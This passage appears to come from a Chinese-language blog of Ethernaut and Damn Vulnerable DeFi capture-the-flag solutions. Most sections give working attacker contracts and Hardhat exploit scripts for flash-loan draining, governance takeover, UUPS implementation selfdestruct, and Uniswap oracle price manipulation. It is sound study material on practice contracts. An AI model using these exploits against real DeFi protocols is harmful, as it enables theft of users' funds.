initialSupply);            _dex = dexInstance;    &#125;    function approve(address owner, address spender, uint256 amount) public &#123;        require(owner != _dex, &quot;InvalidApprover&quot;);        super._approve(owner, spender, amount);    &#125;&#125;  </code></pre><p>题目要求我们把合约内的两个token1 token2都转走<br>题目里的漏洞在哪里？  那就是swap函数没有规定from和to必须是token1和token2中的一个<br>那么我们可以自己部署一个代币 为我们自己铸造很多余额 用它和池中的token1和token2进行交换  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol&quot;;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol&quot;;contract SwappableTokenTwo is ERC20 &#123;    address private _dex;    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;            _mint(msg.sender, initialSupply);            _dex = dexInstance;    &#125;    function approve(address owner, address spender, uint256 amount) public &#123;        require(owner != _dex, &quot;InvalidApprover&quot;);        super._approve(owner, spender, amount);    &#125;&#125;  </code></pre><p>构造的时候最少铸造400个<br>然后给目标合约授权<br>然后进行交换<br><img src="19.1.png" alt="19.1"><br><img src="19.2.png" alt="19.2">  </p><h2 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h2><p>代码<br>    // SPDX-License-Identifier: MIT</p><pre><code>pragma solidity &lt;0.7.0;import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;contract Motorbike &#123;    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    struct AddressSlot &#123;        address value;    &#125;    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.    constructor(address _logic) public &#123;        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;        (bool success,) = _logic.delegatecall(            abi.encodeWithSignature(&quot;initialize()&quot;)        );        require(success, &quot;Call failed&quot;);    &#125;    // Delegates the current call to `implementation`.    function _delegate(address implementation) internal virtual &#123;        // solhint-disable-next-line no-inline-assembly        assembly &#123;            calldatacopy(0, 0, calldatasize())            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)            returndatacopy(0, 0, returndatasize())            switch result            case 0 &#123; revert(0, returndatasize()) &#125;            default &#123; return(0, returndatasize()) &#125;        &#125;    &#125;    // Fallback function that delegates calls to the address returned by `_implementation()`.     // Will run if no other function in the contract matches the call data    fallback () external payable virtual &#123;        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);    &#125;    // Returns an `AddressSlot` with member `value` located at `slot`.    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;        assembly &#123;            r_slot := slot        &#125;    &#125;&#125;contract Engine is Initializable &#123;    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;    address public upgrader;    uint256 public horsePower;    struct AddressSlot &#123;        address value;    &#125;    function initialize() external initializer &#123;        horsePower = 1000;        upgrader = msg.sender;    &#125;    // Upgrade the implementation of the proxy to `newImplementation`    // subsequently execute the function call    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;        _authorizeUpgrade();        _upgradeToAndCall(newImplementation, data);    &#125;    // Restrict to upgrader role    function _authorizeUpgrade() internal view &#123;        require(msg.sender == upgrader, &quot;Can&#39;t upgrade&quot;);    &#125;    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.    function _upgradeToAndCall(        address newImplementation,        bytes memory data    ) internal &#123;        // Initial upgrade and setup call        _setImplementation(newImplementation);        if (data.length &gt; 0) &#123;            (bool success,) = newImplementation.delegatecall(data);            require(success, &quot;Call failed&quot;);        &#125;    &#125;    // Stores a new address in the EIP1967 implementation slot.    function _setImplementation(address newImplementation) private &#123;        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);        AddressSlot storage r;        assembly &#123;            r_slot := _IMPLEMENTATION_SLOT        &#125;        r.value = newImplementation;    &#125;&#125;  </code></pre><p>题目让我们自毁发动机合约<br>我们通过插槽找到逻辑合约（Engine）的地址<br>然后查插槽0和1 发现都是空<br><img src="20.png" alt="20"><br>这是因为代理合约 在调用时用的<br>(bool success,) = _logic.delegatecall(<br>                abi.encodeWithSignature(“initialize()”)<br>            );<br>所以不会影响逻辑合约的插槽 那么相当于engine还未初始化 我们可以初始化成为upgrader<br>然后就可以调用 upgradeToAndCall（） 可以看到call的时候也是delegatecall<br>(bool success,) = newImplementation.delegatecall(data);<br>那么就可以在newImplementation中设置一个自毁函数 那么调用时自毁的就是engine  </p><h2 id="DoubleEntryPoint"><a href="#DoubleEntryPoint" class="headerlink" title="DoubleEntryPoint"></a>DoubleEntryPoint</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;interface DelegateERC20 &#123;function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);&#125;interface IDetectionBot &#123;    function handleTransaction(address user, bytes calldata msgData) external;&#125;interface IForta &#123;    function setDetectionBot(address detectionBotAddress) external;    function notify(address user, bytes calldata msgData) external;    function raiseAlert(address user) external;&#125;contract Forta is IForta &#123;mapping(address =&gt; IDetectionBot) public usersDetectionBots;mapping(address =&gt; uint256) public botRaisedAlerts;function setDetectionBot(address detectionBotAddress) external override &#123;    usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);&#125;function notify(address user, bytes calldata msgData) external override &#123;    if(address(usersDetectionBots[user]) == address(0)) return;    try usersDetectionBots[user].handleTransaction(user, msgData) &#123;        return;    &#125; catch &#123;&#125;&#125;function raiseAlert(address user) external override &#123;    if(address(usersDetectionBots[user]) != msg.sender) return;    botRaisedAlerts[msg.sender] += 1;&#125; &#125;contract CryptoVault &#123;    address public sweptTokensRecipient;    IERC20 public underlying;    constructor(address recipient) &#123;        sweptTokensRecipient = recipient;    &#125;    function setUnderlying(address latestToken) public &#123;        require(address(underlying) == address(0), &quot;Already set&quot;);        underlying = IERC20(latestToken);    &#125;    /*    ...    */    function sweepToken(IERC20 token) public &#123;        require(token != underlying, &quot;Can&#39;t transfer underlying token&quot;);        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));    &#125;&#125;contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123;    DelegateERC20 public delegate;    function mint(address to, uint256 amount) public onlyOwner &#123;        _mint(to, amount);    &#125;    function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123;        delegate = newContract;    &#125;    function transfer(address to, uint256 value) public override returns (bool) &#123;        if (address(delegate) == address(0)) &#123;            return super.transfer(to, value);        &#125; else &#123;            return delegate.delegateTransfer(to, value, msg.sender);        &#125;    &#125;&#125;contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123;    address public cryptoVault;    address public player;    address public delegatedFrom;    Forta public forta;    constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123;        delegatedFrom = legacyToken;        forta = Forta(fortaAddress);        player = playerAddress;        cryptoVault = vaultAddress;        _mint(cryptoVault, 100 ether);    &#125;    modifier onlyDelegateFrom() &#123;        require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;);        _;    &#125;    modifier fortaNotify() &#123;        address detectionBot = address(forta.usersDetectionBots(player));        // Cache old number of bot alerts        uint256 previousValue = forta.botRaisedAlerts(detectionBot);        // Notify Forta        forta.notify(player, msg.data);        // Continue execution        _;        // Check if alarms have been raised        if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);    &#125;    function delegateTransfer(        address to,        uint256 value,        address origSender    ) public override onlyDelegateFrom fortaNotify returns (bool) &#123;        _transfer(origSender, to, value);        return true;    &#125;&#125;</code></pre><p>底层代币是det 不能被调走  但是如果sweepToken中传入的是LGT  那么他有个自己的transfer  如果delegate不为0那么就会转delegatetoken（det）  相当于把底层代币转走了<br>我们要检验交易  只需要检验origSender是不是cryptoVault就可以了<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    interface forta{<br>        function raiseAlert(address user) external;</p><pre><code>&#125;contract bot &#123;    address leToken;    forta target;    mapping(address =&gt; uint256) public botRaisedAlerts;    constructor(address token,address _forta) public&#123;        leToken = token;        target = forta(_forta);    &#125;     function handleTransaction(address user, bytes calldata msgData) external&#123;        (bytes4 a,address to,uint value,address sender) = abi.decode(msgData,(bytes4,address,uint,address));        if(sender == leToken)&#123;            target.raiseAlert(address(0x34B91dA4A48DdE39d19A0DEecF3616aba752210C));        &#125;    &#125;&#125;</code></pre><p>token和forta输cryptoVault和forta地址<br>然后为自己setDetectionBot就可以完成了  </p><h2 id="GoodSamaritan"><a href="#GoodSamaritan" class="headerlink" title="GoodSamaritan"></a>GoodSamaritan</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity &gt;=0.8.0 &lt;0.9.0;</p><pre><code>import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;contract GoodSamaritan &#123;    Wallet public wallet;    Coin public coin;    constructor() &#123;        wallet = new Wallet();        coin = new Coin(address(wallet));        wallet.setCoin(coin);    &#125;    function requestDonation() external returns(bool enoughBalance)&#123;        // donate 10 coins to requester        try wallet.donate10(msg.sender) &#123;            return true;        &#125; catch (bytes memory err) &#123;            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;                // send the coins left                wallet.transferRemainder(msg.sender);                return false;            &#125;        &#125;    &#125;&#125;contract Coin &#123;    using Address for address;    mapping(address =&gt; uint256) public balances;    error InsufficientBalance(uint256 current, uint256 required);    constructor(address wallet_) &#123;        // one million coins for Good Samaritan initially        balances[wallet_] = 10**6;    &#125;    function transfer(address dest_, uint256 amount_) external &#123;        uint256 currentBalance = balances[msg.sender];        // transfer only occurs if balance is enough        if(amount_ &lt;= currentBalance) &#123;            balances[msg.sender] -= amount_;            balances[dest_] += amount_;            if(dest_.isContract()) &#123;                // notify contract                 INotifyable(dest_).notify(amount_);            &#125;        &#125; else &#123;            revert InsufficientBalance(currentBalance, amount_);        &#125;    &#125;&#125;contract Wallet &#123;    // The owner of the wallet instance    address public owner;    Coin public coin;    error OnlyOwner();    error NotEnoughBalance();    modifier onlyOwner() &#123;        if(msg.sender != owner) &#123;            revert OnlyOwner();        &#125;        _;    &#125;    constructor() &#123;        owner = msg.sender;    &#125;    function donate10(address dest_) external onlyOwner &#123;        // check balance left        if (coin.balances(address(this)) &lt; 10) &#123;            revert NotEnoughBalance();        &#125; else &#123;            // donate 10 coins            coin.transfer(dest_, 10);        &#125;    &#125;    function transferRemainder(address dest_) external onlyOwner &#123;        // transfer balance left        coin.transfer(dest_, coin.balances(address(this)));    &#125;    function setCoin(Coin coin_) external onlyOwner &#123;        coin = coin_;    &#125;&#125;interface INotifyable &#123;    function notify(uint256 amount) external;&#125;</code></pre><p>我们要夺走所有代币  调用wallet的donate10如果合约代币余额不够 就会抛出NotEnoughBalance() 然后catch到这个error就会把合约里剩余的代币余额发给你<br>可以看到正常donate10之后的transfer 会触发合约接受者的notify函数 那我们可以在notify函数中抛出NotEnoughBalance()的错误  这样就会把钱都发给合约接收者  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface smart&#123;    function requestDonation() external;&#125;contract Attack&#123;    address target;    error NotEnoughBalance();    constructor(address _target) public payable&#123;        target = _target;    &#125;    function attack() public&#123;        smart(target).requestDonation();    &#125;    function notify(uint256 amount) external&#123;        revert NotEnoughBalance();    &#125;&#125;</code></pre><p>调用attack就可以  </p><h2 id="GatekeeperThree"><a href="#GatekeeperThree" class="headerlink" title="GatekeeperThree"></a>GatekeeperThree</h2><p>代码<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;</p><pre><code>contract SimpleTrick &#123;GatekeeperThree public target;address public trick;uint private password = block.timestamp;constructor (address payable _target) &#123;    target = GatekeeperThree(_target);&#125;function checkPassword(uint _password) public returns (bool) &#123;    if (_password == password) &#123;    return true;    &#125;    password = block.timestamp;    return false;&#125;function trickInit() public &#123;    trick = address(this);&#125;function trickyTrick() public &#123;    if (address(this) == msg.sender &amp;&amp; address(this) != trick) &#123;    target.getAllowance(password);    &#125;&#125;&#125;contract GatekeeperThree &#123;address public owner;address public entrant;bool public allow_enterance = false;SimpleTrick public trick;function construct0r() public &#123;    owner = msg.sender;&#125;modifier gateOne() &#123;    require(msg.sender == owner);    require(tx.origin != owner);    _;&#125;modifier gateTwo() &#123;    require(allow_enterance == true);    _;&#125;modifier gateThree() &#123;    if (address(this).balance &gt; 0.001 ether &amp;&amp; payable(owner).send(0.001 ether) == false) &#123;    _;    &#125;&#125;function getAllowance(uint _password) public &#123;    if (trick.checkPassword(_password)) &#123;        allow_enterance = true;    &#125;&#125;function createTrick() public &#123;    trick = new SimpleTrick(payable(address(this)));    trick.trickInit();&#125;function enter() public gateOne gateTwo gateThree returns (bool entered) &#123;    entrant = tx.origin;    return true;&#125;receive () external payable &#123;&#125;&#125;</code></pre><p>要通过三个修饰符 第一个需要合约调用 并且调用合约为owner<br>这个很好通过 因为constructor写错了 所以我们可以用攻击合约调用constructOr 成为owner<br>第二个修饰符要通过getAllowance（）完成  先createTrick（）  然后通过web3查到password<br>调用getAllowance（）就可以完成<br>第三个修饰符 让攻击合约没有receive或者fallback函数 然后给gatekeeper3转0.001以上的ether就可以完成<br>    // SPDX-License-Identifier: MIT<br>    pragma solidity ^0.8.0;<br>    interface gate{<br>        function construct0r() external;<br>        function enter() external;<br>    }<br>    contract attack{<br>        address target;<br>        constructor(address _target) public{<br>            target = _target;<br>        }</p><pre><code>    function Attack() public&#123;        gate(target).construct0r();        gate(target).enter();    &#125;&#125;  </code></pre><p>调用attack就行</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Damn vaulnerable Defi 题解</title>
      <link href="/2023/02/25/Damn-valurable-defi-sotion/"/>
      <url>/2023/02/25/Damn-valurable-defi-sotion/</url>
      
        <content type="html"><![CDATA[<h2 id="untoppable"><a href="#untoppable" class="headerlink" title="untoppable"></a>untoppable</h2><p>本题让我们将合约的闪贷功能阻止<br>观察闪贷过程可以发现</p><pre><code>function flashLoan(uint256 borrowAmount) external nonReentrant &#123;    require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));    require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);    // Ensured by the protocol via the `depositTokens` function    assert(poolBalance == balanceBefore);    damnValuableToken.transfer(msg.sender, borrowAmount);    IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));    require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);&#125;</code></pre><p>其中要求assert(poolBalance == balanceBefore);<br>poolBalance增加是通过depositToken函数<br>而damnValuableToken还有transfer函数可以将代币转入贷款池<br>所以只需要向贷款池转入任意数量的代币 此条件就不成立 闪贷过程就会被assert  </p><pre><code>await this.token.transfer(this.pool.address,INITIAL_ATTACKER_TOKEN_BALANCE);</code></pre><hr><h2 id="naive-receiver"><a href="#naive-receiver" class="headerlink" title="naive-receiver"></a>naive-receiver</h2><p>这次的闪贷一次要多花1 ether的费用 题目要求我们耗费完接受者合约的ether<br>观察闪贷过程 闪贷未对borrower 进行检测 所以我们可以任意让拥有配套receiveEther函数的别的合约调用flashloan<br>因此 调用十次flashloan borrwoer填接收器合约地址 就可以完成本题目</p><pre><code>it(&#39;Exploit&#39;, async function () &#123;    for (i=0;i&lt;10;i++)&#123;        this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther(ETHER_IN_POOL));    &#125;&#125;);</code></pre><hr><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>题目要求取走闪贷合约的ETH<br>观察闪贷过程  </p><pre><code>function flashLoan(    uint256 borrowAmount,    address borrower,    address target,    bytes calldata data)    external    nonReentrant&#123;    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));    require(balanceBefore &gt;= borrowAmount, &quot;Not enough tokens in pool&quot;);    damnValuableToken.transfer(borrower, borrowAmount);    target.functionCall(data);    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));    require(balanceAfter &gt;= balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);&#125;</code></pre><p>它允许以本合约调用任意合约的任意函数<br>如果我们用它来调用damnValunableToken的approve函数  那我们的合约就有了转走pool里eth的权限</p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#39;contracts/DamnValuableToken.sol&#39;;import &#39;./TrusterLenderPool.sol&#39;;contract trusterAttack&#123;    TrusterLenderPool pool;    DamnValuableToken token;    constructor(address add1,address add2) public&#123;        pool = TrusterLenderPool(add1);        token = DamnValuableToken(add2);    &#125;    function doFlashLoan(uint256 Amount,address borrower,address target,address attacker) public&#123;        bytes memory data = abi.encodeWithSignature(&quot;approve(address,uint256)&quot;,address(this) ,Amount);        pool.flashLoan(0, borrower, target, data);        token.transferFrom(address(pool) , attacker , Amount);    &#125;&#125; it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE  */    const TrusterAttack = await ethers.getContractFactory(&#39;trusterAttack&#39;,attacker);    this.AttackContract = await TrusterAttack.deploy(this.pool.address, this.token.address);    this.AttackContract.doFlashLoan(TOKENS_IN_POOL,this.AttackContract.address,this.token.address,attacker.address);&#125;)</code></pre><hr><h2 id="side-entrance"><a href="#side-entrance" class="headerlink" title="side-entrance"></a>side-entrance</h2><p>题目要求：取走闪贷合约的所有ETH<br>观察合约，闪贷接受方需要实现IFlashLoanEtherReceiver<br>合约中还有deposit 和 withdraw两个函数对应存钱取钱<br>所以如果用闪贷的钱进行deposit，闪贷可以完成并且余额可以增加<br>闪贷结束后再withdraw就可以完成</p><pre><code>pragma solidity ^0.8.0;import &quot;./SideEntranceLenderPool.sol&quot;;contract sideAttack&#123;    SideEntranceLenderPool pool;    uint amount;    constructor(address add,uint num) public &#123;        pool = SideEntranceLenderPool(add);        amount = num;    &#125;    function doFlashloan(uint amount,address addr) public payable&#123;        pool.flashLoan(amount);        pool.withdraw();        selfdestruct(payable(addr));//把钱转给attacker    &#125;    function execute() external payable&#123;        address(pool).call&#123;value: amount&#125;(abi.encodeWithSignature(&quot;deposit()&quot;));    &#125;    receive() external payable&#123;&#125;&#125;    it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const SideEntraceAttackFactory = await ethers.getContractFactory(&#39;sideAttack&#39;,attacker);    this.attackContract = await SideEntraceAttackFactory.deploy(this.pool.address,ETHER_IN_POOL);    this.attackContract.doFlashloan(ETHER_IN_POOL,attacker.address);&#125;);</code></pre><hr><h2 id="the-rewarder"><a href="#the-rewarder" class="headerlink" title="the rewarder"></a>the rewarder</h2><p>在theRewarderPool中，可以观察到如果我们向合约中转入liqToken 合约会为我们铸造accToken 然后按照我们账户accToken 占上一次totalSupply的比重铸造rewardToken（要求每回合只能铸造一次，5天一个回合）<br>其实题目已经提示的很清楚了 通过闪贷贷出大量liqToken 进行deposit，由于liqToken数量很大，所以我们能获得很多rewardToken  </p><pre><code>import &quot;./TheRewarderPool.sol&quot;;import &quot;./FlashLoanerPool.sol&quot;;import &quot;contracts/DamnValuableToken.sol&quot;;import &quot;./RewardToken.sol&quot;;pragma solidity ^0.8.0;contract rewardAttack&#123;    FlashLoanerPool pool;    DamnValuableToken liqToken;    TheRewarderPool rewardpool;    RewardToken token;    constructor(address add1,address add2,address add3,address add4) public &#123;        pool = FlashLoanerPool(add1);        liqToken = DamnValuableToken(add2);        rewardpool = TheRewarderPool(add3);        token = RewardToken(add4);    &#125;    function attack(uint amount) public&#123;        pool.flashLoan(amount);    &#125;    function receiveFlashLoan(uint256 amount) external&#123;        liqToken.approve(address(rewardpool), amount);        rewardpool.deposit(amount);        rewardpool.withdraw(amount);        liqToken.transfer(address(pool), amount);    &#125;    function transfer(address add,uint amount) public&#123;        token.transfer(add, amount);//最后把rewardToken转给attacker以通过验证    &#125;&#125;it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    await ethers.provider.send(&quot;evm_increaseTime&quot;, [5 * 24 * 60 * 60]);//由于题目需求进入第三回合 所以我们必须先等5天再进行deposit才能触发_recordSnapshot()进入第三回合    const RewardAttackFactory = await ethers.getContractFactory(&#39;rewardAttack&#39;,attacker);    this.attackContract = await RewardAttackFactory.deploy( this.flashLoanPool.address,this.liquidityToken.address,this.rewarderPool.address,this.rewardToken.address);    await this.attackContract.attack(TOKENS_IN_LENDER_POOL);    let amount = this.rewardToken.balanceOf(this.attackContract.address);    await this.attackContract.transfer(attacker.address,amount);&#125;);</code></pre><h2 id="selfie"><a href="#selfie" class="headerlink" title="selfie"></a>selfie</h2><p>题目要求我们取走贷款池中的所有代币<br>观察贷款合约 drainAllFunds函数可以将贷款池中的所有代币转移给指定地址 预计要用到这个函数完成目标<br>drainAllFunds函数只有governance可以触发<br>观察governance合约 当我们的代币余额大于总供应的一半时，我们可以请求governance合约去完成一些调用<br>这个调用过程是先通过queueAction函数进行调用请求 然后等待ACTION_DELAY_IN_SECONDS也就是两天之后可以通过executeAction函数执行调用<br>在执行调用的过程中没有进行代币余额的检查<br>所以可以想到闪贷贷出池中的所有货币，对governance合约进行 向贷款池调用drainAllFunds 的调用请求，之后把钱还回去<br>等待两天之后执行调用 我们就可以获得贷款池中的所有代币  </p><pre><code>import &quot;./SelfiePool.sol&quot;;import &quot;./SimpleGovernance.sol&quot;;import &quot;../DamnValuableTokenSnapshot.sol&quot;;pragma solidity ^0.8.0;contract selfieAttack&#123;    SelfiePool pool;    SimpleGovernance governance;    address attacker;    constructor(address add1,address add2,address add4) public &#123;        pool = SelfiePool(add1);        governance = SimpleGovernance(add2);        attacker = add4;    &#125;    function FlashLoan(uint amount) public&#123;        pool.flashLoan(amount);    &#125;    function receiveTokens(address add,uint256 amount) external&#123;        add.call(abi.encodeWithSignature(&quot;snapshot()&quot;));        bytes memory data = abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;,attacker);        governance.queueAction(address(pool),data,0);        (bool success,) = add.call(abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;,address(pool),amount));        require(success,&quot;call failed&quot;);    &#125;    function doAction(uint Id) public &#123;        governance.executeAction(Id);    &#125;&#125;it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const SelfieAttackFactory = await ethers.getContractFactory(&quot;selfieAttack&quot;,attacker);    this.AttackContract = await SelfieAttackFactory.deploy(this.pool.address,this.governance.address,attacker.address);    await this.AttackContract.FlashLoan(TOKENS_IN_POOL);    await ethers.provider.send(&quot;evm_increaseTime&quot;,[2 * 24 * 60 * 60]);    await this.AttackContract.doAction(1);    &#125;);</code></pre><h2 id="puppet"><a href="#puppet" class="headerlink" title="puppet"></a>puppet</h2><p>题目要求：转走贷款池中的所有代币<br>观察贷款池</p><pre><code>function borrow(uint256 borrowAmount) public payable nonReentrant &#123;    uint256 depositRequired = calculateDepositRequired(borrowAmount);    require(msg.value &gt;= depositRequired, &quot;Not depositing enough collateral&quot;);    if (msg.value &gt; depositRequired) &#123;        payable(msg.sender).sendValue(msg.value - depositRequired);    &#125;    deposits[msg.sender] = deposits[msg.sender] + depositRequired;    // Fails if the pool doesn&#39;t have enough tokens in liquidity    require(token.transfer(msg.sender, borrowAmount), &quot;Transfer failed&quot;);    emit Borrowed(msg.sender, depositRequired, borrowAmount);&#125;function calculateDepositRequired(uint256 amount) public view returns (uint256) &#123;    return amount * _computeOraclePrice() * 2 / 10 ** 18;&#125;function _computeOraclePrice() private view returns (uint256) &#123;    // calculates the price of the token in wei according to Uniswap pair    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);&#125;</code></pre><p>发现如果想要借走代币，需要抵押相应的ETH，价格与uniswapPair中的ETH和代币储存量有关，如果uniswapPair中代币变多，那么价格就会降低<br>uniswapPair从10 ETH 10 DVTt 开始<br>我们有1000 DVT 和25ETH  </p><pre><code>function tokenToEthOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline, address buyer, address payable recipient) private returns (uint256) &#123;require(deadline &gt;= block.timestamp &amp;&amp; eth_bought &gt; 0);uint256 token_reserve = token.balanceOf(address(this));uint256 tokens_sold = getOutputPrice(eth_bought, token_reserve, address(this).balance);// tokens sold is always &gt; 0require(max_tokens &gt;= tokens_sold);recipient.transfer(eth_bought);require(token.transferFrom(buyer, address(this), tokens_sold));emit EthPurchase(buyer, tokens_sold, eth_bought);return tokens_sold;</code></pre><p>  }</p><p>  function tokenToEthSwapOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline) public returns (uint256) {<br>    return tokenToEthOutput(eth_bought, max_tokens, deadline, msg.sender, msg.sender);<br>  }  </p><p>调用uniswapPair的tokenToETHSwapOutput可以将代币换为ETH<br>因此我们存入向uniswapPair自己的代币换出ETH，这样pool中的代币价格就变低了 我们就可以borrow了</p><pre><code>it(&#39;Exploit&#39;, async function () &#123;    const deadline = (await ethers.provider.getBlock(&#39;latest&#39;)).timestamp * 2    await this.token.connect(attacker).approve(this.uniswapExchange.address,ATTACKER_INITIAL_TOKEN_BALANCE);    const AMOUNT = await ethers.utils.parseEther(&quot;900&quot;)    await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(AMOUNT ,1, deadline);    const value = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);    await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,&#123;value:value&#125;);&#125;);</code></pre><p><strong>还应该特别注意两点：</strong><br>每个交易都应由attacker发出<br>不能全把自己的token转入<br>因为验证条件需要attacker的代币余额大于POOL_INITIAL_TOKEN_BALANCE</p><h2 id="puppet-v2"><a href="#puppet-v2" class="headerlink" title="puppet-v2"></a>puppet-v2</h2><p>和上一题相比，抵押物成了WETH，也更新了计算价格的方法  </p><pre><code>function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) &#123;    return _getOracleQuote(tokenAmount).mul(3) / (10 ** 18);&#125;// Fetch the price from Uniswap v2 using the official librariesfunction _getOracleQuote(uint256 amount) private view returns (uint256) &#123;    (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(        _uniswapFactory, address(_weth), address(_token)    );    return UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);&#125;</code></pre><p>价格为amount<em>reverseWETH</em>3/reverseToken<br>所以uniswapv2中weth越少，token越多 价格越低<br>uniswapv2可以用swap对两种代币进行交换，所以我们把自己的token换为weth就可以完成题目  </p><pre><code>// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract puppetv2Attack&#123;    address pool;    address token;    address weth;    constructor(address add1,address add2,address add3) public&#123;        pool = add1;        token = add2;        weth = add3;    &#125;    function giveToken(bytes memory data2)public &#123;        (bool success,) = weth.call(data2);        require(success,&quot;call 2 failed&quot;);    &#125;    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) public pure returns (uint amountOut)&#123;        require(amountIn &gt; 0, &#39;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#39;);        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#39;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#39;);        uint amountInWithFee = amountIn*(997);        uint numerator = amountInWithFee*(reserveOut);        uint denominator = reserveIn*(1000)+(amountInWithFee);        amountOut = numerator / denominator;    &#125;//这个是粘贴uniswapLibrary里的计算方法 给出输入 计算输出    function uniswapV2Call(address target,uint256 amount0,uint256 amount1,bytes calldata data) external&#123;        (bool success,) = token.call(data);        require(success,&quot;call failed&quot;);    &#125;    receive() external payable&#123;&#125;&#125;   it(&#39;Exploit&#39;, async function () &#123;    /** CODE YOUR EXPLOIT HERE */    const ATTACKER_TOKEN_TO_SWAP = ethers.utils.parseEther(&#39;9999&#39;);    const value = ethers.utils.parseEther(&#39;19.9&#39;);    await this.weth.connect(attacker).deposit(&#123;value:  value&#125;);    const AttackContractFactory = await ethers.getContractFactory(&quot;puppetv2Attack&quot;,attacker);    this.AttackContract = await AttackContractFactory.deploy(this.uniswapExchange.address,this.token.address,this.weth.address);    //计算数据 部署合约准备    await this.token.connect(attacker).transfer(this.AttackContract.address,ATTACKER_TOKEN_TO_SWAP);    const amountOut = await this.AttackContract.getAmountOut(ATTACKER_TOKEN_TO_SWAP,UNISWAP_INITIAL_TOKEN_RESERVE,UNISWAP_INITIAL_WETH_RESERVE);    //计算输出    const data = web3.eth.abi.encodeFunctionCall(&#123;        name: &#39;transfer&#39;,        type: &#39;function&#39;,        inputs:[&#123;            type: &#39;address&#39;,            name: &#39;add&#39;        &#125;,&#123;            type: &#39;uint256&#39;,            name: &#39;amount&#39;        &#125;]    &#125;,[this.uniswapExchange.address,ATTACKER_TOKEN_TO_SWAP]);    await this.uniswapExchange.connect(attacker).swap(0,amountOut,this.AttackContract.address,data)    //进行交换    const amount1 = await this.weth.balanceOf(this.AttackContract.address);    const data2 = 